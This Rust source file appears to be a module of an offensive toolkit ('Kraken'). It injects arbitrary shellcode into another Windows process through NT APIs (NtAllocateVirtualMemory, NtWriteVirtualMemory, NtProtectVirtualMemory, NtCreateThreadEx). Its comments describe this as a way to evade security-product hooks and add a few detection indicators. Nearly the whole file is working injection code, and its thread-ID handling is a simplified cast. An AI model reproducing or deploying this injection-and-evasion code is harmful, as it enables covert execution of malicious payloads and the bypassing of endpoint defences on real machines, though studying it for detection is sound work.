//! Tier 2: NT API injection
//!
//! Uses native NT APIs instead of Win32 wrappers:
//! - NtOpenProcess
//! - NtAllocateVirtualMemory
//! - NtWriteVirtualMemory
//! - NtProtectVirtualMemory
//! - NtCreateThreadEx
//!
//! These APIs are less commonly hooked by security products and can be
//! combined with direct syscalls for further evasion.
//!
//! Detection: Sysmon Event 8/10, ETW Microsoft-Windows-Threat-Intelligence

#[cfg(windows)]
use crate::{handle::OwnedHandle, InjectionResult};
#[cfg(windows)]
use common::KrakenError;

#[cfg(windows)]
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory};
#[cfg(windows)]
use ntapi::ntpsapi::NtCreateThreadEx;
#[cfg(windows)]
use ntapi::winapi::ctypes::c_void as nt_void;
#[cfg(windows)]
use windows_sys::Win32::Foundation::{NTSTATUS, WAIT_OBJECT_0};
#[cfg(windows)]
use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_COMMIT, MEM_RESERVE};
#[cfg(windows)]
use windows_sys::Win32::System::Threading::{
    OpenProcess, WaitForSingleObject, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
    PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
};

/// Check if NTSTATUS indicates success
#[cfg(windows)]
#[inline]
fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

/// Inject using NT APIs (bypasses user-mode hooks on kernel32)
///
/// # Arguments
/// * `target_pid` - Process ID of the target
/// * `shellcode` - The shellcode bytes to inject
/// * `wait` - Whether to wait for the injected thread to complete
/// * `timeout_ms` - Timeout in milliseconds (0 = infinite)
///
/// # Returns
/// * `Ok(InjectionResult)` on success
/// * `Err(KrakenError)` on failure
///
/// # Detection Indicators
/// - Direct ntdll.dll calls without kernel32 in call stack
/// - NtAllocateVirtualMemory + NtWriteVirtualMemory + NtCreateThreadEx pattern
/// - Sysmon Event 10 with access mask for VM operations
#[cfg(windows)]
pub fn inject(
    target_pid: u32,
    shellcode: &[u8],
    wait: bool,
    timeout_ms: u32,
) -> Result<InjectionResult, KrakenError> {
    let access =
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;

    // Open target process (using Win32 here, could use NtOpenProcess for full NT)
    let proc_handle = unsafe { OpenProcess(access, 0, target_pid) };
    let proc_handle = OwnedHandle::new(proc_handle)
        .ok_or_else(|| KrakenError::Module("NtOpenProcess failed".into()))?;

    tracing::debug!(target_pid, "opened target process via NT API path");

    // Allocate memory using NtAllocateVirtualMemory
    let mut base_address: *mut nt_void = std::ptr::null_mut();
    let mut region_size: usize = shellcode.len();

    let status = unsafe {
        NtAllocateVirtualMemory(
            proc_handle.as_raw() as *mut _,
            &mut base_address as *mut *mut nt_void,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if !nt_success(status) {
        return Err(KrakenError::Module(format!(
            "NtAllocateVirtualMemory failed: 0x{:08X}",
            status
        )));
    }

    tracing::debug!(
        target_pid,
        addr = ?base_address,
        size = region_size,
        "allocated remote memory via NtAllocateVirtualMemory"
    );

    // Write shellcode using NtWriteVirtualMemory
    let mut bytes_written: usize = 0;
    let status = unsafe {
        NtWriteVirtualMemory(
            proc_handle.as_raw() as *mut _,
            base_address,
            shellcode.as_ptr() as *mut _,
            shellcode.len(),
            &mut bytes_written,
        )
    };

    if !nt_success(status) {
        // Cleanup allocated memory on failure
        let mut free_size: usize = 0;
        unsafe {
            ntapi::ntmmapi::NtFreeVirtualMemory(
                proc_handle.as_raw() as *mut _,
                &mut base_address as *mut *mut nt_void,
                &mut free_size,
                windows_sys::Win32::System::Memory::MEM_RELEASE,
            );
        }
        return Err(KrakenError::Module(format!(
            "NtWriteVirtualMemory failed: 0x{:08X}",
            status
        )));
    }

    tracing::debug!(
        target_pid,
        bytes_written,
        "wrote shellcode via NtWriteVirtualMemory"
    );

    // Change protection to RX using NtProtectVirtualMemory
    let mut protect_size: usize = shellcode.len();
    let mut old_protect: u32 = 0;
    let status = unsafe {
        NtProtectVirtualMemory(
            proc_handle.as_raw() as *mut _,
            &mut base_address as *mut *mut nt_void,
            &mut protect_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    if !nt_success(status) {
        let mut free_size: usize = 0;
        unsafe {
            ntapi::ntmmapi::NtFreeVirtualMemory(
                proc_handle.as_raw() as *mut _,
                &mut base_address as *mut *mut nt_void,
                &mut free_size,
                windows_sys::Win32::System::Memory::MEM_RELEASE,
            );
        }
        return Err(KrakenError::Module(format!(
            "NtProtectVirtualMemory failed: 0x{:08X}",
            status
        )));
    }

    tracing::debug!(target_pid, "changed memory protection to RX via NtProtectVirtualMemory");

    // Create remote thread using NtCreateThreadEx
    let mut thread_handle: *mut nt_void = std::ptr::null_mut();
    let status = unsafe {
        NtCreateThreadEx(
            &mut thread_handle as *mut *mut nt_void,
            0x1FFFFF, // THREAD_ALL_ACCESS
            std::ptr::null_mut(),
            proc_handle.as_raw() as *mut _,
            base_address,
            std::ptr::null_mut(),
            0,  // CreateFlags
            0,  // ZeroBits
            0,  // StackSize
            0,  // MaximumStackSize
            std::ptr::null_mut(),
        )
    };

    if !nt_success(status) || thread_handle.is_null() {
        let mut free_size: usize = 0;
        unsafe {
            ntapi::ntmmapi::NtFreeVirtualMemory(
                proc_handle.as_raw() as *mut _,
                &mut base_address as *mut *mut nt_void,
                &mut free_size,
                windows_sys::Win32::System::Memory::MEM_RELEASE,
            );
        }
        return Err(KrakenError::Module(format!(
            "NtCreateThreadEx failed: 0x{:08X}",
            status
        )));
    }

    // Get thread ID from handle (simplified - in production would use NtQueryInformationThread)
    let thread_id = thread_handle as u32;

    let owned_thread = OwnedHandle::new(thread_handle as isize);

    tracing::info!(
        target_pid,
        thread_id,
        "created remote thread via NtCreateThreadEx"
    );

    // Wait for thread completion if requested
    if wait {
        if let Some(ref th) = owned_thread {
            let timeout = if timeout_ms == 0 { 0xFFFFFFFF } else { timeout_ms };
            let wait_result = unsafe { WaitForSingleObject(th.as_raw(), timeout) };
            if wait_result != WAIT_OBJECT_0 {
                tracing::warn!(target_pid, thread_id, "injection thread wait timed out");
            }
        }
    }

    Ok(InjectionResult {
        success: true,
        thread_id: Some(thread_id),
        technique_used: "NT API (NtCreateThreadEx)".to_string(),
        error: None,
    })
}

#[cfg(not(windows))]
pub fn inject(
    _pid: u32,
    _shellcode: &[u8],
    _wait: bool,
    _timeout_ms: u32,
) -> Result<crate::InjectionResult, common::KrakenError> {
    Err(common::KrakenError::Module(
        "NT API injection only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(not(windows))]
    #[test]
    fn test_inject_non_windows() {
        let result = inject(1234, &[0x90], false, 0);
        assert!(result.is_err());
    }

    #[test]
    fn test_nt_success_check() {
        #[cfg(windows)]
        {
            assert!(nt_success(0));  // STATUS_SUCCESS
            assert!(nt_success(0x00000001));  // Positive = success
            assert!(!nt_success(-1));  // Negative = error
            assert!(!nt_success(-0x3FFFFFFF_i32));  // STATUS_UNSUCCESSFUL range
        }
    }
}
